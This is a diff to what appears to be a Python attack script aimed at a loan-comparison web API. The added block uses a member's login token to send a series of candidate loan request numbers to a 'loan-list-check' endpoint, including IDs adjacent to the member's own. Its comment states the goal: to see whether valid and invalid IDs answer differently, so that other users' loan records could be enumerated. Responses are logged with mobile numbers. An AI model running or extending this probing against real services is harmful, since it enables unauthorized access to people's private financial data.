@@ -168,6 +168,31 @@ def main():
             probe("noseq_follow", ft, {"appType": "FOLLOWING"})
             probe("noseq_exist", ft, {"appType": "EXISTING"})
 
+        # 1b. loan-list-check WITH member token: shape study of loReqtNo
+        #     discrimination (anon gave flat 401; with JWT we may see
+        #     valid-vs-invalid divergence => enumeration feasibility)
+        ymd = time.strftime("%Y%m%d")
+        lchk_cands = ["1", "100", "1000000", ymd + "00000000001",
+                      "999999999999999999999"]
+        if mseq:
+            try:
+                msi = int(mseq)
+                lchk_cands += [str(msi - 1), str(msi), str(msi + 1)]
+            except ValueError:
+                pass
+        for lr in lchk_cands:
+            if reqs >= MAX_REQ_PER_MEMBER:
+                break
+            reqs += 1
+            cst, cdoc = post(tok, "/bigyo/api/bigyo/loan-list-check?loReqtNo="
+                                  + urllib.parse.quote(lr))
+            cb = json.dumps(cdoc, ensure_ascii=False)[:200]
+            journal({"ts": time.strftime("%FT%TZ", time.gmtime()),
+                     "mobile": mob, "kind": "lchk_tok", "loReqtNo": lr,
+                     "status": cst, "resp": cb})
+            print(f"LCHK-TOK {mob} {lr} -> {cst} {cb[:120]}", flush=True)
+            time.sleep(PACE)
+
         # 2. loReqtNo as seq
         for lr in lreqs[:3]:
             probe("lreq_as_seq", "CREDIT", {"bigyoLoanFlwSeq": lr, "applyType": "EXISTING", "step": "1"})
